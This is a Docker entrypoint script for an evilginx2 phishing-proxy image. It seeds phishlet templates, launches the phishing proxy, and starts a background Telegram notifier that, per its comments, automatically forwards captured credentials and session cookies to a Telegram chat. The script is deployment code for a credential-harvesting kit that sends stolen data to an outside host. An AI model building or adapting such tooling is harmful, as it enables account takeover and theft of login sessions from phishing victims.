#!/bin/sh
# entrypoint.sh for evilginx2 docker image
set -e

APP_DIR=/app
SEED_PHISHLETS=/usr/local/share/evilginx/phishlets

# ------------------------------------------------------------------
# 1. Create / ensure data directories exist
# ------------------------------------------------------------------
for d in "$APP_DIR/phishlets" "$APP_DIR/sessions" "$APP_DIR/certs"; do
    if [ ! -d "$d" ]; then
        mkdir -p "$d"
    fi
done

# ------------------------------------------------------------------
# 2. Seed the persistent phishlets volume on FIRST run only.
#    (bind-mounting an empty ./phishlets would otherwise hide the
#    phishlets baked into the image)
# ------------------------------------------------------------------
if [ -d "$SEED_PHISHLETS" ]; then
    if [ -z "$(ls -A "$APP_DIR/phishlets" 2>/dev/null)" ]; then
        echo "[entrypoint] Seeding phishlets into $APP_DIR/phishlets ..."
        cp -r "$SEED_PHISHLETS"/. "$APP_DIR/phishlets"/
    fi
fi

# ------------------------------------------------------------------
# 3. Start the Telegram notifier (optional).
#    Requires TG_BOT_TOKEN and TG_CHAT_ID env vars.
#    Sends captured credentials + cookies to Telegram automatically.
# ------------------------------------------------------------------
if [ -n "$TG_BOT_TOKEN" ] && [ -n "$TG_CHAT_ID" ]; then
    echo "[entrypoint] Telegram notifications enabled."
    setsid /usr/local/bin/telegram-watch.sh >/dev/null 2>&1 &
fi

# ------------------------------------------------------------------
# 4. Fix ownership of mounted volumes, then drop to non-root user
# ------------------------------------------------------------------
if [ "$(id -u)" = "0" ]; then
    chown -R evilginx:evilginx "$APP_DIR" 2>/dev/null || true
    exec su-exec evilginx:evilginx /usr/local/bin/evilginx "$@"
fi

# Already non-root (user override set in compose) - just run
exec /usr/local/bin/evilginx "$@"
